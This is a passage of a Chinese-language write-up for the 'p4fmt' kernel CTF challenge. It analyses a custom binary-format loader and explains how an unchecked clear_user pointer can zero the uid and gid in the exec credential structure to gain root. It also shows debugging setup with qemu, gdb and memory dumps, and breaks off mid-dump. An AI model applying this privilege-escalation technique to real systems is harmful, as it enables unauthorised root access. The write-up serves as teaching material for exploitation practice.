<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">LABEL_12:</span><br><span class="line">        install_exec_creds(v4);</span><br><span class="line">        set_binfmt(&amp;p4format);</span><br><span class="line">        v14 = <span class="number">0x7FFFFFFFF000</span>LL;</span><br><span class="line">        v15 = __readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task);</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)v15 &amp; <span class="number">0x20000000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = <span class="number">0xC0000000</span>LL;</span><br><span class="line">          <span class="keyword">if</span> ( !(*(_BYTE *)(v15 + <span class="number">131</span>) &amp; <span class="number">8</span>) )</span><br><span class="line">            v14 = <span class="number">0xFFFFE000</span>LL;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = setup_arg_pages(v4, v14, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">if</span> ( !v10 )</span><br><span class="line">        &#123;</span><br><span class="line">          finalize_exec(v4);</span><br><span class="line">          start_thread(</span><br><span class="line">            v9 + <span class="number">16216</span>,</span><br><span class="line">            v13,</span><br><span class="line">            *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x100</span>) + <span class="number">0x28</span>LL));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = *(_QWORD *)(v4 + <span class="number">0x58</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br></pre></td></tr></table></figure>
<p>程序会以文件偏移0x58-0x48=0x10处的值作为程序入口点<br>而后执行： install_exec_creds:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">install_exec_creds</span><span class="params">(struct linux_binprm *bprm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	security_bprm_committing_creds(bprm);</span><br><span class="line"></span><br><span class="line">	commit_creds(bprm-&gt;cred);</span><br><span class="line">	bprm-&gt;cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (get_dumpable(current-&gt;mm) != SUID_DUMP_USER)</span><br><span class="line">		perf_event_exit_task(current);</span><br><span class="line"></span><br><span class="line">	security_bprm_committed_creds(bprm);</span><br><span class="line">	mutex_unlock(&amp;current-&gt;signal-&gt;cred_guard_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以可执行文件整体格式:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;P4\x00&quot;</span><br><span class="line">(char)type</span><br><span class="line">(int)map_info_num</span><br><span class="line">(long)map_info_offset</span><br><span class="line">(long)entry</span><br><span class="line">((map_info struct)map_info)*map_info_num</span><br><span class="line">the_code_will_exec</span><br></pre></td></tr></table></figure>
<p>因此我们需要想办法使我们的最后code运行在root身份下<br>此时code只需执行shell或者直接读取/flag操作即可<br>注意到加载过程中根据map_info程序会有clear_user操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v17 &amp; <span class="number">8</span> )</span><br><span class="line">&#123;</span><br><span class="line">  vm_mmap(<span class="number">0L</span>L, v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">  printk(<span class="string">"clear_user(addr=0x%llx, length=0x%llx)\n"</span>, v16-&gt;load_addr, v16-&gt;length, v22, v23);</span><br><span class="line">  _clear_user(v16-&gt;load_addr, v16-&gt;length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>但是程序并没有检测此处指针<br>根据前面的 install_exec_creds，程序会根据commit_creds(bprm-&gt;cred)来设置线程权限<br>因此我们可以传入clear_user一个指针指向此cred结构体特定位置来覆盖uid和gid来提升线程权限,而后commit_creds(bprm-&gt;cred)即会根据我们覆盖后的fake_cred来设置线程权限执行我们的code</strong><br><strong>关于linux_binprm：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binprm</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> buf[BINPRM_BUF_SIZE];</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> vma_pages;</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"> <span class="meta"># <span class="meta-keyword">define</span> MAX_ARG_PAGES 32</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>[<span class="title">MAX_ARG_PAGES</span>];</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> p; <span class="comment">/* current top of mem */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> argmin; <span class="comment">/* rlimit marker for copy_strings() */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * True after the bprm_set_creds hook has been called once</span></span><br><span class="line"><span class="comment">    * (multiple calls can be made via prepare_binprm() for</span></span><br><span class="line"><span class="comment">    * binfmt_script/misc).</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    called_set_creds:<span class="number">1</span>,</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * True if most recent call to the commoncaps bprm_set_creds</span></span><br><span class="line"><span class="comment">    * hook (due to multiple prepare_binprm() calls from the</span></span><br><span class="line"><span class="comment">    * binfmt_script/misc handlers) resulted in elevated</span></span><br><span class="line"><span class="comment">    * privileges.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    cap_elevated:<span class="number">1</span>,</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Set by bprm_set_creds hook to indicate a privilege-gaining</span></span><br><span class="line"><span class="comment">    * exec has happened. Used to sanitize execution environment </span></span><br><span class="line"><span class="comment">   * and to set AT_SECURE auxv for glibc.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    secureexec:<span class="number">1</span>;</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">ifdef</span> __alpha__</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> taso:<span class="number">1</span>; </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> recursion_depth; <span class="comment">/* only for search_binary_handler() */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span> </span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span> <span class="comment">/* new credentials */</span></span><br><span class="line">  <span class="keyword">int</span> unsafe;   <span class="comment">/* how unsafe this exec is (mask of LSM_UNSAFE_*) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> per_clear; <span class="comment">/* bits to clear in current-&amp;gt;personality */</span></span><br><span class="line">  <span class="keyword">int</span> argc, envc;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> * filename; <span class="comment">/* Name of binary as seen by procps */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> * interp; <span class="comment">/* Name of the binary really executed. Most</span></span><br><span class="line"><span class="comment">   of the time same as filename, but could be</span></span><br><span class="line"><span class="comment">   different for binfmt_&#123;misc,script&#125; */</span></span><br><span class="line">  <span class="keyword">unsigned</span> interp_flags;</span><br><span class="line">  <span class="keyword">unsigned</span> interp_data;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> loader, exec;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim_stack</span>;</span> <span class="comment">/* Saved RLIMIT_STACK used during exec. */</span></span><br><span class="line"> &#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p><strong>关于cred：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>cred是每个线程记录本线程权限的结构体<br>当我们将uid和gid覆盖为0即可使此线程获得root权限<br>(root运行下uid和gid皆为0)</strong></p>
<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>关于调试和leak cred<br><strong>首先为了便于调试，将身份改为root，修改init脚本并重新打包文件系统：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">mount -t proc none &#x2F;proc</span><br><span class="line">mount -t sysfs none &#x2F;sys</span><br><span class="line">insmod  &#x2F;p4fmt.ko  </span><br><span class="line"></span><br><span class="line">sleep 2</span><br><span class="line"></span><br><span class="line">ln -s &#x2F;dev&#x2F;console &#x2F;dev&#x2F;ttyS0</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;EOF</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">p4fmt</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Kernel challs are always a bit painful.</span><br><span class="line">No internet access, no SSH, no file copying.</span><br><span class="line"></span><br><span class="line">You&#39;re stuck with copy pasting base64&#39;d (sometimes static) ELFs.</span><br><span class="line">But what if there was another solution?</span><br><span class="line"></span><br><span class="line">We&#39;ve created a lightweight, simple binary format for your</span><br><span class="line">pwning pleasure. It&#39;s time to prove your skills.</span><br><span class="line"></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">setsid cttyhack su root</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>而后重新打包文件系统：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o -H  newc |gzip -9 &gt; ..&#x2F;kirin.cpio.gz</span><br></pre></td></tr></table></figure>
<p>而后从bzImage提取vmlinux便于调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line">	# Use readelf to check if it&#39;s a valid ELF</span><br><span class="line">	# TODO: find a better to way to check that it&#39;s really vmlinux</span><br><span class="line">	#       and not just an elf</span><br><span class="line">	readelf -h $1 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">	cat $1</span><br><span class="line">	exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line">	# The obscure use of the &quot;tr&quot; filter is to work around older versions of</span><br><span class="line">	# &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span><br><span class="line"></span><br><span class="line">	# Try to find the header ($1) and decompress from here</span><br><span class="line">	for	pos in &#96;tr &quot;$1\n$2&quot; &quot;\n$2&#x3D;&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;&#96;</span><br><span class="line">	do</span><br><span class="line">		pos&#x3D;$&#123;pos%%:*&#125;</span><br><span class="line">		tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">		check_vmlinux $tmp</span><br><span class="line">	done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Check invocation:</span><br><span class="line">me&#x3D;$&#123;0##*&#x2F;&#125;</span><br><span class="line">img&#x3D;$1</span><br><span class="line">if	[ $# -ne 1 -o ! -s &quot;$img&quot; ]</span><br><span class="line">then</span><br><span class="line">	echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2</span><br><span class="line">	exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Prepare temp files:</span><br><span class="line">tmp&#x3D;$(mktemp &#x2F;tmp&#x2F;vmlinux-XXX)</span><br><span class="line">trap &quot;rm -f $tmp&quot; 0</span><br><span class="line"></span><br><span class="line"># That didn&#39;t work, so retry after decompression.</span><br><span class="line">try_decompress &#39;\037\213\010&#39; xy    gunzip</span><br><span class="line">try_decompress &#39;\3757zXZ\000&#39; abcde unxz</span><br><span class="line">try_decompress &#39;BZh&#39;          xy    bunzip2</span><br><span class="line">try_decompress &#39;\135\0\0\0&#39;   xxx   unlzma</span><br><span class="line">try_decompress &#39;\211\114\132&#39; xy    &#39;lzop -d&#39;</span><br><span class="line">try_decompress &#39;\002!L\030&#39;   xxx   &#39;lz4 -d&#39;</span><br><span class="line">try_decompress &#39;(\265&#x2F;\375&#39;   xxx   unzstd</span><br><span class="line"></span><br><span class="line"># Finally check for uncompressed images or objects:</span><br><span class="line">check_vmlinux $img</span><br><span class="line"></span><br><span class="line"># Bail out:</span><br><span class="line">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kirin.sh  .&#x2F;bzImage  &gt; .&#x2F;vmlinux</span><br></pre></td></tr></table></figure>
<p>最后更改qemu启动脚本以便调试内核：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">qemu-system-x86_64 -s  -kernel .&#x2F;bzImage \</span><br><span class="line">		-initrd .&#x2F;kirin.cpio.gz \</span><br><span class="line">		-nographic \</span><br><span class="line">		-append &quot;console&#x3D;ttyS0 nokaslr&quot; \</span><br><span class="line">#-s:1234端口调试内核</span><br><span class="line">#nokaslr关闭内核地址随机，便于调试</span><br></pre></td></tr></table></figure>
<p>运行gdb连接即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; # whoami</span><br><span class="line">root</span><br><span class="line">&#x2F; # cat &#x2F;proc&#x2F;modules </span><br><span class="line">p4fmt 16384 0 - Live 0xffffffffc0000000 (O)</span><br><span class="line">qemu虚拟机下看到p4fmt模块的加载地址</span><br><span class="line">连接gdb并加载符号表：</span><br><span class="line">gdb .&#x2F;vmlinux</span><br><span class="line">target remote 127.0.0.1:1234</span><br><span class="line">add-symbol-file .&#x2F;p4fmt.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>
<p><strong>关于leak：</strong><br>在load_p4_binary调用install_exec_creds时下断点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *0xffffffffc00000af</span><br></pre></td></tr></table></figure>
<p>而后随意写一个满足上面格式的程序运行，gdb断在install_exec_creds以便查看cred相对bprm的偏移<br>实际上可以直接查看汇编：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;10i 0xffffffffc00000af</span><br><span class="line">pwndbg&gt; x&#x2F;10i 0xffffffffc00000af</span><br><span class="line">   0xffffffffc00000af &lt;load_p4_binary+175&gt;:	call   0xffffffff81189ec0</span><br><span class="line">   0xffffffffc00000b4 &lt;load_p4_binary+180&gt;:	mov    rdi,0xffffffffc0002000</span><br><span class="line">   0xffffffffc00000bb &lt;load_p4_binary+187&gt;:	call   0xffffffff8118a130</span><br><span class="line">   0xffffffffc00000c0 &lt;load_p4_binary+192&gt;:	movabs rsi,0x7ffffffff000</span><br><span class="line">   0xffffffffc00000ca &lt;load_p4_binary+202&gt;:	mov    rax,QWORD PTR gs:0x14d40</span><br><span class="line">   0xffffffffc00000d3 &lt;load_p4_binary+211&gt;:	mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0xffffffffc00000d6 &lt;load_p4_binary+214&gt;:	test   edx,0x20000000</span><br><span class="line">   0xffffffffc00000dc &lt;load_p4_binary+220&gt;:	je     0xffffffffc00000f3 &lt;load_p4_binary+243&gt;</span><br><span class="line">   0xffffffffc00000de &lt;load_p4_binary+222&gt;:	test   BYTE PTR [rax+0x83],0x8</span><br><span class="line">   0xffffffffc00000e5 &lt;load_p4_binary+229&gt;:	mov    esi,0xc0000000</span><br></pre></td></tr></table></figure>
<p>跟进0xffffffff81189ec0：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10i 0xffffffff81189ec0</span><br><span class="line">&#x3D;&gt; 0xffffffff81189ec0:	push   rbx</span><br><span class="line">   0xffffffff81189ec1:	mov    rbx,rdi</span><br><span class="line">   0xffffffff81189ec4:	call   0xffffffff81297aa0</span><br><span class="line">   0xffffffff81189ec9:	mov    rdi,QWORD PTR [rbx+0xe0]</span><br><span class="line">   0xffffffff81189ed0:	call   0xffffffff81073d30</span><br><span class="line">   0xffffffff81189ed5:	mov    QWORD PTR [rbx+0xe0],0x0</span><br><span class="line">   0xffffffff81189ee0:	mov    rdi,QWORD PTR gs:0x14d40</span><br><span class="line">   0xffffffff81189ee9:	mov    rax,QWORD PTR [rdi+0x100]</span><br><span class="line">   0xffffffff81189ef0:	mov    rax,QWORD PTR [rax+0x148]</span><br><span class="line">   0xffffffff81189ef7:	and    eax,0x3</span><br></pre></td></tr></table></figure>
<p>可以看到偏移位置为0xe0<br>随意运行一个调试:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30xg 0xffff8880077b2400</span><br><span class="line">0xffff8880077b2400:	0xffff888007530020	0xffff8880077d7280</span><br><span class="line">0xffff8880077b2410:	0x0000000000000000	0xffff888007530020</span><br><span class="line">0xffff8880077b2420:	0x0000000000000000	0x00007fffffdff030</span><br><span class="line">0xffff8880077b2430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff8880077b2440:	0x0000000600000000	0x0000000101003450</span><br><span class="line">0xffff8880077b2450:	0x0000000000000090	0xffffffff89262008</span><br><span class="line">0xffff8880077b2460:	0x0000000000002000	0x0000000000000000</span><br><span class="line">0xffff8880077b2470:	0x6262626262626262	0x6161616161616161</span><br><span class="line">0xffff8880077b2480:	0x6161616161616161	